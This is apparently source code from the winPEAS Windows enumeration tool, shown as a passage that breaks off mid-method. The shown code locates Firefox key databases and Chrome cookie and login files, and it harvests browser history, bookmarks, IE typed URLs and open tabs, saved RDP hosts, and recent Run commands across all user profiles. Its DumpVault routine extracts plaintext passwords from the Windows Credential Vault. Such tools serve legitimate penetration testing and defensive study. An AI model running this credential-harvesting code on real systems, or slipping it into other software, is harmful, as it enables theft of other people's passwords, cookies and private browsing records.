using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;
using System.Xml;


namespace winPEAS
{
    class KnownFileCredsInfo
    {

        private KnownFileCredsInfo() { }
        public static List<string> GetFirefoxDbs()
        {
            List<string> results = new List<string>();
            // checks if Firefox has a history database
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", dir);
                            if (System.IO.Directory.Exists(userFirefoxBasePath))
                            {
                                string[] directories = Directory.GetDirectories(userFirefoxBasePath);
                                foreach (string directory in directories)
                                {
                                    string firefoxCredentialFile3 = String.Format("{0}\\{1}", directory, "key3.db");
                                    if (System.IO.File.Exists(firefoxCredentialFile3))
                                        results.Add(firefoxCredentialFile3);

                                    string firefoxCredentialFile4 = String.Format("{0}\\{1}", directory, "key4.db");
                                    if (System.IO.File.Exists(firefoxCredentialFile4))
                                        results.Add(firefoxCredentialFile3);
                                }
                            }
                        }
                    }
                }
                else
                {
                    string userName = Environment.GetEnvironmentVariable("USERNAME");
                    string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                    if (System.IO.Directory.Exists(userFirefoxBasePath))
                    {
                        string[] directories = Directory.GetDirectories(userFirefoxBasePath);
                        foreach (string directory in directories)
                        {
                            string firefoxCredentialFile3 = String.Format("{0}\\{1}", directory, "key3.db");
                            if (System.IO.File.Exists(firefoxCredentialFile3))
                                results.Add(firefoxCredentialFile3);

                            string firefoxCredentialFile4 = String.Format("{0}\\{1}", directory, "key4.db");
                            if (System.IO.File.Exists(firefoxCredentialFile4))
                                results.Add(firefoxCredentialFile4);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }

            return results;
        }


        public static List<string> ParseFirefoxHistory(string path)
        {
            List<string> results = new List<string>();
            // parses a Firefox history file via regex
            if (System.IO.Directory.Exists(path))
            {
                string[] directories = Directory.GetDirectories(path);
                foreach (string directory in directories)
                {
                    string firefoxHistoryFile = String.Format("{0}\\{1}", directory, "places.sqlite");
                    Regex historyRegex = new Regex(@"(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?");

                    try
                    {
                        using (StreamReader r = new StreamReader(firefoxHistoryFile))
                        {
                            string line;
                            while ((line = r.ReadLine()) != null)
                            {
                                Match m = historyRegex.Match(line);
                                if (m.Success)
                                    results.Add(m.Groups[0].ToString().Trim());
                            }
                        }
                    }
                    catch (System.IO.IOException exception)
                    {
                        Console.WriteLine("\r\n    [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).", exception.Message);
                    }
                    catch (Exception ex)
                    {
                        Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
                    }
                }
            }
            return results;
        }

        public static List<string> GetFirefoxHistory()
        {
            List<string> results = new List<string>();
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", dir);
                            results = ParseFirefoxHistory(userFirefoxBasePath);
                        }
                    }
                }
                else
                {
                    string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    results = ParseFirefoxHistory(userFirefoxBasePath);
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }

        public static Dictionary<string, string> GetChromeDbs()
        {
            Dictionary<string, string> results = new Dictionary<string, string>();
            // checks if Chrome has a history database
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);
                            if (System.IO.File.Exists(userChromeCookiesPath))
                                results["userChromeCookiesPath"] = userChromeCookiesPath;

                            string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);
                            if (System.IO.File.Exists(userChromeLoginDataPath))
                                results["userChromeLoginDataPath"] = userChromeLoginDataPath;
                        }
                    }
                }
                else
                {
                    string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    if (System.IO.File.Exists(userChromeCookiesPath))
                        results["userChromeCookiesPath"] = userChromeCookiesPath;

                    string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    if (System.IO.File.Exists(userChromeLoginDataPath))
                        results["userChromeLoginDataPath"] = userChromeLoginDataPath;
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }



        public static List<string> ParseChromeHistory(string path)
        {
            List<string> results = new List<string>();

            // parses a Chrome history file via regex
            if (System.IO.File.Exists(path))
            {
                Regex historyRegex = new Regex(@"(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?");

                try
                {
                    using (StreamReader r = new StreamReader(path))
                    {
                        string line;
                        while ((line = r.ReadLine()) != null)
                        {
                            Match m = historyRegex.Match(line);
                            if (m.Success)
                            {
                                results.Add(m.Groups[0].ToString().Trim());
                            }
                        }
                    }
                }
                catch (System.IO.IOException exception)
                {
                    Console.WriteLine("\r\n    [x] IO exception, history file likely in use (i.e. Browser is likely running): ", exception.Message);
                }
                catch (Exception ex)
                {
                    Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
                }
            }
            return results;
        }


        public static List<string> ParseChromeBookmarks(string path)
        {
            List<string> results = new List<string>();
            // parses a Chrome bookmarks
            if (System.IO.File.Exists(path))
            {
                try
                {
                    string contents = System.IO.File.ReadAllText(path);

                    // reference: http://www.tomasvera.com/programming/using-javascriptserializer-to-parse-json-objects/
                    JavaScriptSerializer json = new JavaScriptSerializer();
                    Dictionary<string, object> deserialized = json.Deserialize<Dictionary<string, object>>(contents);
                    Dictionary<string, object> roots = (Dictionary<string, object>)deserialized["roots"];
                    Dictionary<string, object> bookmark_bar = (Dictionary<string, object>)roots["bookmark_bar"];
                    System.Collections.ArrayList children = (System.Collections.ArrayList)bookmark_bar["children"];

                    foreach (Dictionary<string, object> entry in children)
                    {
                        //Console.WriteLine("      Name: {0}", entry["name"].ToString().Trim());
                        if (entry.ContainsKey("url"))
                            results.Add(entry["url"].ToString().Trim());
                    }
                }
                catch (System.IO.IOException exception)
                {
                    Console.WriteLine("\r\n    [x] IO exception, Bookmarks file likely in use (i.e. Chrome is likely running).", exception.Message);
                }
                catch (Exception ex)
                {
                    Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
                }
            }
            return results;
        }


        public static Dictionary<string, List<string>> GetChromeHistBook()
        {
            Dictionary<string, List<string>> results = new Dictionary<string, List<string>>()
            {
                { "history", new List<string>() },
                { "bookarks", new List<string>() },
            };
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    Console.WriteLine("\r\n\r\n=== Chrome (All Users) ===");

                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", dir);
                            results["history"] = ParseChromeHistory(userChromeHistoryPath);

                            string userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", dir);
                            results["bookmarks"] = ParseChromeBookmarks(userChromeBookmarkPath);
                        }
                    }
                }
                else
                {
                    string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    results["history"] = ParseChromeHistory(userChromeHistoryPath);

                    string userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                    results["bookmarks"] = ParseChromeBookmarks(userChromeBookmarkPath);
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }



        public static Dictionary<string, List<string>> GetIEHistFav()
        {
            int lastDays = 90;
            Dictionary<string, List<string>> results = new Dictionary<string, List<string>>()
            {
                { "history", new List<string>() },
                { "favorites", new List<string>() },
            };

            DateTime startTime = System.DateTime.Now.AddDays(-lastDays);

            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string[] SIDs = Registry.Users.GetSubKeyNames();
                    foreach (string SID in SIDs)
                    {
                        if (SID.StartsWith("S-1-5") && !SID.EndsWith("_Classes"))
                        {
                            Dictionary<string, object> settings = MyUtils.GetRegValues("HKU", String.Format("{0}\\SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs", SID));
                            if ((settings != null) && (settings.Count > 1))
                            {
                                foreach (KeyValuePair<string, object> kvp in settings)
                                {
                                    byte[] timeBytes = MyUtils.GetRegValueBytes("HKU", String.Format("{0}\\SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLsTime", SID), kvp.Key.ToString().Trim());
                                    if (timeBytes != null)
                                    {
                                        long timeLong = (long)(BitConverter.ToInt64(timeBytes, 0));
                                        DateTime urlTime = DateTime.FromFileTime(timeLong);
                                        if (urlTime > startTime)
                                        {
                                            results["history"].Add(kvp.Value.ToString().Trim());
                                        }
                                    }
                                }
                            }
                        }
                    }

                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userIEBookmarkPath = String.Format("{0}\\Favorites\\", dir);

                            if (Directory.Exists(userIEBookmarkPath))
                            {
                                string[] bookmarkPaths = Directory.GetFiles(userIEBookmarkPath, "*.url", SearchOption.AllDirectories);
                                if (bookmarkPaths.Length != 0)
                                {
                                    foreach (string bookmarkPath in bookmarkPaths)
                                    {
                                        using (StreamReader rdr = new StreamReader(bookmarkPath))
                                        {
                                            string line;
                                            string url = "";
                                            while ((line = rdr.ReadLine()) != null)
                                            {
                                                if (line.StartsWith("URL=", StringComparison.InvariantCultureIgnoreCase))
                                                {
                                                    if (line.Length > 4)
                                                        url = line.Substring(4);
                                                    break;
                                                }
                                            }
                                            results["history"].Add(url.ToString().Trim());
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                else
                {
                    Dictionary<string, object> settings = MyUtils.GetRegValues("HKCU", "SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs");
                    if ((settings != null) && (settings.Count != 0))
                    {
                        foreach (KeyValuePair<string, object> kvp in settings)
                        {
                            byte[] timeBytes = MyUtils.GetRegValueBytes("HKCU", "SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLsTime", kvp.Key.ToString().Trim());
                            if (timeBytes != null)
                            {
                                long timeLong = (long)(BitConverter.ToInt64(timeBytes, 0));
                                DateTime urlTime = DateTime.FromFileTime(timeLong);
                                if (urlTime > startTime)
                                {
                                    results["history"].Add(kvp.Value.ToString().Trim());
                                }
                            }
                        }
                    }

                    string userIEBookmarkPath = String.Format("{0}\\Favorites\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                    string[] bookmarkPaths = Directory.GetFiles(userIEBookmarkPath, "*.url", SearchOption.AllDirectories);

                    foreach (string bookmarkPath in bookmarkPaths)
                    {
                        using (StreamReader rdr = new StreamReader(bookmarkPath))
                        {
                            string line;
                            string url = "";
                            while ((line = rdr.ReadLine()) != null)
                            {
                                if (line.StartsWith("URL=", StringComparison.InvariantCultureIgnoreCase))
                                {
                                    if (line.Length > 4)
                                        url = line.Substring(4);
                                    break;
                                }
                            }
                            results["favorites"].Add(url.ToString().Trim());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex));
            }
            return results;
        }


        public static List<string> GetCurrentIETabs()
        {
            List<string> results = new List<string>();
            // Lists currently open Internet Explorer tabs, via COM
            // Notes:
            //  https://searchcode.com/codesearch/view/9859954/
            //  https://gist.github.com/yizhang82/a1268d3ea7295a8a1496e01d60ada816

            try
            {
                // Shell.Application COM GUID
                Type shell = Type.GetTypeFromCLSID(new Guid("13709620-C279-11CE-A49E-444553540000"));

                // actually instantiate the Shell.Application COM object
                Object shellObj = Activator.CreateInstance(shell);

                // grab all the current windows
                Object windows = shellObj.GetType().InvokeMember("Windows", BindingFlags.InvokeMethod, null, shellObj, null);

                // grab the open tab count
                Object openTabs = windows.GetType().InvokeMember("Count", BindingFlags.GetProperty, null, windows, null);
                int openTabsCount = Int32.Parse(openTabs.ToString());

                for (int i = 0; i < openTabsCount; i++)
                {
                    // grab the acutal tab
                    Object item = windows.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, windows, new object[] { i });
                    try
                    {
                        // extract the tab properties
                        Object locationName = item.GetType().InvokeMember("LocationName", BindingFlags.GetProperty, null, item, null);
                        Object locationURL = item.GetType().InvokeMember("LocationUrl", BindingFlags.GetProperty, null, item, null);

                        // ensure we have a site address
                        if (Regex.IsMatch(locationURL.ToString(), @"(^https?://.+)|(^ftp://)"))
                        {
                            results.Add(String.Format("{0}", locationURL));
                        }
                        Marshal.ReleaseComObject(item);
                        item = null;
                    }
                    catch
                    {
                        //
                    }
                }
                Marshal.ReleaseComObject(windows);
                windows = null;
                Marshal.ReleaseComObject(shellObj);
                shellObj = null;
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex));
            }
            return results;
        }


        public static class VaultCli
        {
            // pulled directly from @djhohnstein's SharpWeb project: https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
            public enum VAULT_ELEMENT_TYPE : Int32
            {
                Undefined = -1,
                Boolean = 0,
                Short = 1,
                UnsignedShort = 2,
                Int = 3,
                UnsignedInt = 4,
                Double = 5,
                Guid = 6,
                String = 7,
                ByteArray = 8,
                TimeStamp = 9,
                ProtectedArray = 10,
                Attribute = 11,
                Sid = 12,
                Last = 13
            }

            public enum VAULT_SCHEMA_ELEMENT_ID : Int32
            {
                Illegal = 0,
                Resource = 1,
                Identity = 2,
                Authenticator = 3,
                Tag = 4,
                PackageSid = 5,
                AppStart = 100,
                AppEnd = 10000
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
            public struct VAULT_ITEM_WIN8
            {
                public Guid SchemaId;
                public IntPtr pszCredentialFriendlyName;
                public IntPtr pResourceElement;
                public IntPtr pIdentityElement;
                public IntPtr pAuthenticatorElement;
                public IntPtr pPackageSid;
                public UInt64 LastModified;
                public UInt32 dwFlags;
                public UInt32 dwPropertiesCount;
                public IntPtr pPropertyElements;
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
            public struct VAULT_ITEM_WIN7
            {
                public Guid SchemaId;
                public IntPtr pszCredentialFriendlyName;
                public IntPtr pResourceElement;
                public IntPtr pIdentityElement;
                public IntPtr pAuthenticatorElement;
                public UInt64 LastModified;
                public UInt32 dwFlags;
                public UInt32 dwPropertiesCount;
                public IntPtr pPropertyElements;
            }

            [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]
            public struct VAULT_ITEM_ELEMENT
            {
                [FieldOffset(0)]
                public VAULT_SCHEMA_ELEMENT_ID SchemaElementId;
                [FieldOffset(8)]
                public VAULT_ELEMENT_TYPE Type;
            }

            [DllImport("vaultcli.dll")]
            public extern static Int32 VaultOpenVault(ref Guid vaultGuid, UInt32 offset, ref IntPtr vaultHandle);

            [DllImport("vaultcli.dll")]
            public extern static Int32 VaultEnumerateVaults(Int32 offset, ref Int32 vaultCount, ref IntPtr vaultGuid);

            [DllImport("vaultcli.dll")]
            public extern static Int32 VaultEnumerateItems(IntPtr vaultHandle, Int32 chunkSize, ref Int32 vaultItemCount, ref IntPtr vaultItem);

            [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
            public extern static Int32 VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, Int32 arg6, ref IntPtr passwordVaultPtr);

            [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
            public extern static Int32 VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, Int32 arg5, ref IntPtr passwordVaultPtr);

        }


        public static object GetVaultElementValue(IntPtr vaultElementPtr)
        {
            // Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct
            // pulled directly from @djhohnstein's SharpWeb project: https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
            object results;
            object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
            FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
            var partialElementType = partialElementInfo.GetValue(partialElement);

            IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);
            switch ((int)partialElementType)
            {
                case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
                    IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
                    results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);
                    break;
                case 0: // VAULT_ELEMENT_TYPE == bool
                    results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);
                    results = (bool)results;
                    break;
                case 1: // VAULT_ELEMENT_TYPE == Short
                    results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
                    break;
                case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
                    results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
                    break;
                case 3: // VAULT_ELEMENT_TYPE == Int
                    results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
                    break;
                case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
                    results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
                    break;
                case 5: // VAULT_ELEMENT_TYPE == Double
                    results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));
                    break;
                case 6: // VAULT_ELEMENT_TYPE == GUID
                    results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));
                    break;
                case 12: // VAULT_ELEMENT_TYPE == Sid
                    IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
                    var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                    results = sidObject.Value;
                    break;
                default:
                    /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
                     * Lord Graeber. Thus we do not implement them. */
                    results = null;
                    break;
            }
            return results;
        }

        public static List<Dictionary<string, string>> DumpVault()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();

            try
            {
                // pulled directly from @djhohnstein's SharpWeb project: https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
                var OSVersion = Environment.OSVersion.Version;
                var OSMajor = OSVersion.Major;
                var OSMinor = OSVersion.Minor;

                Type VAULT_ITEM;

                if (OSMajor >= 6 && OSMinor >= 2)
                {
                    VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8);
                }
                else
                {
                    VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7);
                }

                Int32 vaultCount = 0;
                IntPtr vaultGuidPtr = IntPtr.Zero;
                var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);

                //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);

                if ((int)result != 0)
                {
                    Console.WriteLine("  [ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
                    return results;
                }

                // Create dictionary to translate Guids to human readable elements
                IntPtr guidAddress = vaultGuidPtr;
                Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>();
                vaultSchema.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
                vaultSchema.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
                vaultSchema.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
                vaultSchema.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
                vaultSchema.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
                vaultSchema.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
                vaultSchema.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
                vaultSchema.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
                vaultSchema.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);

                for (int i = 0; i < vaultCount; i++)
                {

                    // Open vault block
                    object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));
                    Guid vaultGuid = new Guid(vaultGuidString.ToString());
                    guidAddress = (IntPtr)(guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));
                    IntPtr vaultHandle = IntPtr.Zero;
                    string vaultType;
                    if (vaultSchema.ContainsKey(vaultGuid))
                    {
                        vaultType = vaultSchema[vaultGuid];
                    }
                    else
                    {
                        vaultType = vaultGuid.ToString();
                    }
                    result = VaultCli.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle);
                    if (result != 0)
                    {
                        Console.WriteLine("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
                        continue;
                    }
                    // Vault opened successfully! Continue.

                    // Fetch all items within Vault
                    int vaultItemCount = 0;
                    IntPtr vaultItemPtr = IntPtr.Zero;
                    result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
                    if (result != 0)
                    {
                        Console.WriteLine("Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
                        continue;
                    }
                    var structAddress = vaultItemPtr;
                    if (vaultItemCount > 0)
                    {
                        // For each vault item...
                        for (int j = 1; j <= vaultItemCount; j++)
                        {
                            Dictionary<string, string> vault_cred = new Dictionary<string, string>() {
                            { "GUID", String.Format("{0}", vaultGuid) },
                            { "Type", vaultType },
                            { "Resource", "" },
                            { "Identity", "" },
                            { "PacakgeSid", "" },
                            { "Credential", "" },
                            { "Last Modified", "" },
                            { "Error", "" }
                        };

                            // Begin fetching vault item...
                            var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);
                            structAddress = (IntPtr)(structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));

                            IntPtr passwordVaultItem = IntPtr.Zero;
                            // Field Info retrieval
                            FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
                            Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
                            FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
                            IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
                            FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
                            IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
                            FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
                            UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);

                            IntPtr pPackageSid = IntPtr.Zero;
                            if (OSMajor >= 6 && OSMinor >= 2)
                            {
                                // Newer versions have package sid
                                FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
                                pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
                                result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
                            }
                            else
                            {
                                result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
                            }

                            if (result != 0)
                            {
                                vault_cred["Error"] = "Occured while retrieving vault item. Error: 0x" + result.ToString();
                                continue;
                            }
                            object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
                            FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
                            IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
                            // Fetch the credential from the authenticator element
                            object cred = GetVaultElementValue(pAuthenticatorElement);
                            object packageSid = null;
                            if (pPackageSid != IntPtr.Zero && pPackageSid != null)
                            {
                                packageSid = GetVaultElementValue(pPackageSid);
                            }
                            if (cred != null) // Indicates successful fetch
                            {
                                object resource = GetVaultElementValue(pResourceElement);
                                if (resource != null)
                                {
                                    vault_cred["Resource"] = String.Format("{0}", resource);
                                }
                                object identity = GetVaultElementValue(pIdentityElement);
                                if (identity != null)
                                {
                                    vault_cred["Identity"] = String.Format("{0}", identity);
                                }
                                if (packageSid != null)
                                {
                                    vault_cred["PacakgeSid"] = String.Format("{0}", packageSid);
                                }
                                vault_cred["Credential"] = String.Format("{0}", cred);
                                vault_cred["Last Modified"] = String.Format("{0}", System.DateTime.FromFileTimeUtc((long)lastModified));
                                results.Add(vault_cred);
                            }
                        }
                    }
                }
            }
            catch(Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }


        public static List<Dictionary<string, string>> GetSavedRDPConnections()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            //shows saved RDP connections, including username hints (if present)
            if (MyUtils.IsHighIntegrity())
            {
                string[] SIDs = Registry.Users.GetSubKeyNames();
                foreach (string SID in SIDs)
                {
                    if (SID.StartsWith("S-1-5") && !SID.EndsWith("_Classes"))
                    {
                        string[] subkeys = MyUtils.GetRegSubkeys("HKU", String.Format("{0}\\Software\\Microsoft\\Terminal Server Client\\Servers", SID));
                        if (subkeys != null)
                        {
                            //Console.WriteLine("\r\n\r\n=== Saved RDP Connection Information ({0}) ===", SID);
                            foreach (string host in subkeys)
                            {
                                string usernameHint = MyUtils.GetRegValue("HKCU", String.Format("Software\\Microsoft\\Terminal Server Client\\Servers\\{0}", host), "UsernameHint");
                                Dictionary<string, string> rdp_info = new Dictionary<string, string>() {
                                    { "SID", SID },
                                    { "Host", host },
                                    { "Username Hint", usernameHint },
                                };
                                results.Add(rdp_info);
                            }
                        }
                    }
                }
            }
            else
            {
                string[] subkeys = MyUtils.GetRegSubkeys("HKCU", "Software\\Microsoft\\Terminal Server Client\\Servers");
                if (subkeys != null)
                {
                    foreach (string host in subkeys)
                    {
                        string usernameHint = MyUtils.GetRegValue("HKCU", String.Format("Software\\Microsoft\\Terminal Server Client\\Servers\\{0}", host), "UsernameHint");
                        Dictionary<string, string> rdp_info = new Dictionary<string, string>() {
                            { "SID", "" },
                            { "Host", host },
                            { "Username Hint", usernameHint },
                        };
                        results.Add(rdp_info);
                    }
                }
            }
            return results;
        }

        public static Dictionary<string, object> GetRecentRunCommands()
        {
            Dictionary<string, object> results = new Dictionary<string, object>();
            // lists recently run commands via the RunMRU registry key
            if (MyUtils.IsHighIntegrity())
            {
                string[] SIDs = Registry.Users.GetSubKeyNames();
                foreach (string SID in SIDs)
                {
                    if (SID.StartsWith("S-1-5") && !SID.EndsWith("_Classes"))
